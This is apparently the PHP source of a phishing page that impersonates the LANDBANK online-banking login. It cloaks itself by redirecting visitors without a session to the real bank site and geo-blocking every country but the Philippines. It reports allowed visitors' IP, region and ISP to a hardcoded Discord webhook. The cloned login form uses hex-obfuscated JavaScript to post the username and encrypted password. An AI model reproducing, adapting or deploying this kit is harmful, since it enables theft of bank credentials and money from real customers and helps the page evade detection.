<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', '0');
set_time_limit(0);
date_default_timezone_set('Asia/Manila');

session_start();
$_SESSION["y"] = '';
if(empty($_SESSION["x"]) ){
    session_destroy();
    session_unset();
    header("Location: https://www.landbank.com/about-us");
    die();
}


$blockedCountries = array("A1","A2","AD","AE","AF","AG","AI","AL","AM","AN","AO","AP","AQ","AR","AS","AT","AU","AW","AX","AZ","BA","BB","BD","BE","BF","BG","BH","BI",
"BJ","BM","BN","BO","BR","BS","BT","BV","BW","BY","BZ","CA","CC","CD","CF","CG","CH","CI","CK","CL","CM","CN","CO","CR","CU","CV","CX","CY","CZ","DE","DJ","DK","DM",
"DO","DZ","EC","EE","EG","EH","ER","ES","ET","EU","FI","FJ","FK","FM","FO","FR","GA","GB","GD","GE","GF","GG","GH","GI","GL","GM","GN","GP","GQ","GR","GS","GT","GU",
"GW","GY","HK","HM","HN","HR","HT","HU","ID","IE","IL","IM","IN","IO","IQ","IR","IS","IT","JE","JM","JO","JP","KE","KG","KH","KI","KM","KN","KP","KR","KW","KY","KZ",
"LA","LB","LC","LI","LK","LR","LS","LT","LU","LV","LY","MA","MC","MD","ME","MG","MH","MK","ML","MM","MN","MO","MP","MQ","MR","MS","MT","MU","MV","MW","MX","MY","MZ",
"NA","NC","NE","NF","NG","NI","NL","NO","NP","NR","NU","NZ","OM","PA","PE","PF","PG","PK","PL","PM","PN","PR","PS","PT","PW","PY","QA","RE","RO","RS","RU","RW","SA",
"SB","SC","SD","SE","SG","SH","SI","SJ","SK","SL","SM","SN","SO","SR","ST","SV","SY","SZ","TC","TD","TF","TG","TH","TJ","TK","TL","TM","TN","TO","TR","TT","TV","TW",
"TZ","UA","UG","UM","US","UY","UZ","VA","VC","VE","VG","VI","VN","VU","WF","WS","YE","YT","ZA","ZM","ZW");

$unblockedCountries = array("PH"); // Allowed list

// $blockWebhook = "https://discord.com/api/webhooks/1368251905029181550/x_z3gQ1leOx9oiQJLxHfYz2MQM8rcsWJyzXIG3S30bFYXe6VANxQIbdtXY612IRvtUuc";
$unblockWebhook = "https://discord.com/api/webhooks/1394796849751265392/-6Txo_wjrguOgZAmBsWqWKhZ00HDEamocQGviYVd3EvsqJS_v7F4SStUM_FvX9eYIbtA";

$ip = $_SERVER['REMOTE_ADDR'];

$geoUrl = "http://ip-api.com/json/$ip";

$response = file_get_contents($geoUrl);
$data = json_decode($response, true);

if (!$data || $data['status'] !== 'success') {
    error_log("Failed for IP: $ip");
    exit;
}

$countryCode = $data['countryCode'] ?? 'XX';
$countryName = $data['country'] ?? 'Unknown';
$region = $data['regionName'] ?? 'Unknown';
$isp = $data['isp'] ?? 'Unknown';

function sendDiscordAlert($webhook, $ip, $countryCode, $countryName, $region, $isp, $status, $color) {
        $payload = json_encode([
            "username" => "🌐 LBP iAccess Monitoring",
            "avatar_url" => "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7P4CpxuhkmnaABwQq791Zn5Ci2N1ZTT5JKw&s",
            "embeds" => [[
                "title" => "🔍 Access $status",
                "description" => "```md\n" .
                                 "# A visitor attempted to access the system\n\n" . "```".
                                 "```"."💻 IP Address:    $ip\n" . "```".
                                 "```"."🧠 Status:        $status ✓ \n" . "```".
                                 "```"."🌍 Country:       $countryName ($countryCode)\n" . "```".
                                 "```"."🏛️ Region:        $region\n" . "```".
                                 "```"."📡 ISP:           $isp\n" . "```"."\n",
                                 
                "color" => $status === "Allowed" ? 0x2ecc71 : ($status === "Blocked" ? 0xe74c3c : 0x95a5a6),
                "footer" => [
                    "text" => "LBP iAccess • Monitoring Engine",
                    "icon_url" => "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7P4CpxuhkmnaABwQq791Zn5Ci2N1ZTT5JKw&s"
                ],
                "timestamp" => date("c")
            ]]
        ]);
    
        $options = [
            'http' => [
                'header'  => "Content-Type: application/json\r\n",
                'method'  => 'POST',
                'content' => $payload,
            ]
        ];
        $context = stream_context_create($options);
        @file_get_contents($webhook, false, $context); // suppress errors
    }
    
     if (in_array($countryCode, $blockedCountries)) {
         //sendDiscordAlert($blockWebhook, $ip, $countryCode, $countryName, $region, $isp, "Blocked", 16711680);
         http_response_code(403);
         exit("Access Denied");
     }
    
    if (in_array($countryCode, $unblockedCountries)) {
        sendDiscordAlert($unblockWebhook, $ip, $countryCode, $countryName, $region, $isp, "Allowed", 65280);
    }
echo '
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LANDBANK Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
   <link rel=apple-touch-icon href=img/lb-icon.png>
 <link rel="shortcut icon" sizes=96x96 href=img/lb-icon.png>
 <link rel="shortcut icon" type="image/x-icon" href="img/lb-icon.png" />
<script type="text/javascript" src="js/jquery-v1.7.1.js"></script>
<script type="text/javascript" src="js/jquery-v2.js"></script>
<script type="text/javascript" src="js/jsencrypt.min.js"></script>
 <script src="js/jquery.min.js"></script>  
</head>

  <!-- Container for login card -->
<center>  <div class="p-6 rounded-lg w-96">
    <!-- Heading -->
<center><img src="img/center-logo-removebg-preview.png" alt="LANDBANK" width="220" height="240"></center><br>
    <!-- Login Form -->
    </head>
  <body class="login" oncontextmenu="return false;">
  <script type="text/javascript">
        function resetdata()
    {
      document.LoginForm.loginid.value = "";
      document.LoginForm.uipassword.value = "";
      document.LoginForm.loginid.focus();
      return false;
    } 

  </script>
  <form id="LoginForm"  name="LoginForm" method="post" onsubmit="loginx(); return false;" action="login.php"> 
    
<div id="wrapper">
      <div id="header">
          <div id="" class="error-message">
           <center> <ul><li style="color:red;"id="error-message"></center>
            
          </li></ul>

      <!-- Username field -->
      <div class="mb-4">
        <label for="username" class="block text-gray-700"></label>
        <input style="border-style: solid;" type="text" id="username" name="loginid" class="w-full px-4 py-2 mt-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Username" required>
      </div>

      <!-- Password field -->
      <div class="mb-6">
        <label for="password" class="block text-gray-700"></label>
        <input type="password" id="password" name="uipassword" class="w-full px-4 py-2 mt-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Password" required>
      </div>

      <!-- Login button -->
      <div class="mb-4">
        <button type="submit" class="w-full bg-green-500 text-white py-2 rounded-md hover:bg-green-800 focus:outline-none focus:ring-2 focus:ring-green-500">LOGIN</button>
      </div>
  </div>
  </form>
<div class="modal"><!-- Place at bottom of page --></div>
  
<p style="font-size:16px; color:green;"><a href="#">Open an Account</a></p>
<p style="font-size:14px;"> Not yet enrolled? <a style="color:green;"href="#">Sign up now!</a></p>
  <script>
var _0xda77=["\x6C\x6F\x61\x64\x69\x6E\x67","\x74\x6F\x67\x67\x6C\x65\x43\x6C\x61\x73\x73","\x62\x6F\x64\x79","\x4D\x49\x49\x42\x49\x6A\x41\x4E\x42\x67\x6B\x71\x68\x6B\x69\x47\x39\x77\x30\x42\x41\x51\x45\x46\x41\x41\x4F\x43\x41\x51\x38\x41\x4D\x49\x49\x42\x43\x67\x4B\x43\x41\x51\x45\x41\x6A\x6E\x6B\x55\x34\x73\x57\x30\x35\x73\x62\x70\x68\x7A\x4B\x2F\x63\x49\x6C\x58\x34\x77\x51\x71\x47\x47\x4F\x34\x75\x4E\x4E\x50\x41\x6B\x44\x76\x6B\x38\x73\x73\x61\x71\x39\x48\x36\x56\x51\x55\x79\x48\x66\x4C\x45\x4F\x6D\x74\x6F\x51\x61\x50\x74\x6A\x57\x72\x4E\x30\x64\x69\x42\x6F\x61\x31\x32\x76\x6F\x33\x66\x2B\x34\x78\x5A\x41\x6B\x2B\x61\x74\x50\x31\x43\x73\x48\x2F\x58\x64\x6F\x31\x54\x33\x31\x50\x43\x59\x54\x73\x51\x32\x4B\x47\x6F\x6F\x78\x56\x50\x6B\x38\x66\x68\x69\x6D\x69\x57\x49\x7A\x4E\x50\x4D\x38\x31\x50\x30\x47\x57\x76\x56\x4F\x51\x2F\x4D\x71\x7A\x33\x42\x43\x4F\x4C\x55\x6A\x50\x44\x45\x4F\x2B\x32\x65\x31\x41\x33\x6F\x52\x78\x51\x50\x2B\x46\x68\x2F\x67\x2B\x50\x39\x59\x57\x68\x55\x6E\x44\x64\x4D\x2B\x55\x49\x58\x4D\x73\x64\x45\x51\x47\x36\x41\x36\x52\x30\x64\x63\x32\x73\x45\x4B\x63\x64\x44\x43\x36\x36\x71\x75\x6C\x6C\x64\x33\x67\x2B\x36\x68\x45\x6E\x37\x6A\x42\x52\x43\x4C\x44\x6A\x6B\x32\x76\x6F\x4B\x34\x58\x79\x59\x5A\x58\x65\x42\x53\x58\x74\x6F\x30\x71\x38\x6E\x50\x66\x70\x74\x63\x79\x6B\x2F\x35\x70\x7A\x38\x63\x35\x4B\x61\x55\x67\x64\x70\x50\x77\x54\x31\x33\x4F\x62\x45\x46\x55\x4A\x45\x68\x35\x7A\x52\x31\x57\x67\x75\x45\x49\x53\x36\x6B\x64\x47\x6E\x47\x36\x4C\x30\x68\x7A\x32\x46\x46\x39\x52\x64\x48\x37\x77\x43\x54\x78\x72\x6D\x79\x77\x6F\x6B\x4E\x45\x79\x66\x4C\x32\x4C\x62\x57\x45\x58\x6F\x52\x4D\x2F\x6C\x6C\x43\x43\x7A\x4E\x6E\x72\x77\x49\x44\x41\x51\x41\x42","\x73\x65\x74\x50\x75\x62\x6C\x69\x63\x4B\x65\x79","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x73\x74\x61\x74\x75\x73","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x65\x72\x72\x6F\x72\x2D\x6D\x65\x73\x73\x61\x67\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x73\x75\x62\x6D\x69\x74","\x4C\x6F\x67\x69\x6E\x46\x6F\x72\x6D","\x50\x4F\x53\x54","","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x67\x72\x61\x6E\x74\x5F\x74\x79\x70\x65\x3D\x70\x61\x73\x73\x77\x6F\x72\x64\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D\x6F\x6E\x6C\x69\x6E\x65\x62\x61\x6E\x6B\x69\x6E\x67\x26\x63\x6C\x69\x65\x6E\x74\x5F\x73\x65\x63\x72\x65\x74\x3D\x39\x64\x65\x32\x35\x32\x31\x36\x2D\x33\x37\x66\x30\x2D\x34\x32\x64\x30\x2D\x38\x39\x63\x63\x2D\x65\x31\x66\x64\x66\x38\x64\x30\x66\x34\x31\x37\x26\x75\x73\x65\x72\x6E\x61\x6D\x65\x3D","\x76\x61\x6C\x75\x65","\x6C\x6F\x67\x69\x6E\x69\x64","\x26\x70\x61\x73\x73\x77\x6F\x72\x64\x3D","\x75\x69\x70\x61\x73\x73\x77\x6F\x72\x64","\x65\x6E\x63\x72\x79\x70\x74","\x73\x65\x6E\x64"];function loginx(){$(_0xda77[2])[_0xda77[1]](_0xda77[0]);var _0x984fx2= new JSEncrypt;_0x984fx2[_0xda77[4]](_0xda77[3]);var _0x984fx3= new XMLHttpRequest();_0x984fx3[_0xda77[5]]= function(){if(this[_0xda77[6]]== 401){document[_0xda77[9]](_0xda77[8])[_0xda77[7]]= this[_0xda77[10]];$(_0xda77[2])[_0xda77[1]](_0xda77[0])}else {if(this[_0xda77[6]]== 200){$(_0xda77[2])[_0xda77[1]](_0xda77[0]);document[_0xda77[9]](_0xda77[8])[_0xda77[7]]= this[_0xda77[10]];document[_0xda77[12]][_0xda77[11]]()}}};_0x984fx3[_0xda77[15]](_0xda77[13],_0xda77[14],true);_0x984fx3[_0xda77[18]](_0xda77[16],_0xda77[17]);_0x984fx3[_0xda77[25]](_0xda77[19]+ document[_0xda77[12]][_0xda77[21]][_0xda77[20]]+ _0xda77[22]+ encodeURIComponent(_0x984fx2[_0xda77[24]](document[_0xda77[12]][_0xda77[23]][_0xda77[20]])))}

</script>
</div>
</body>
</html>';
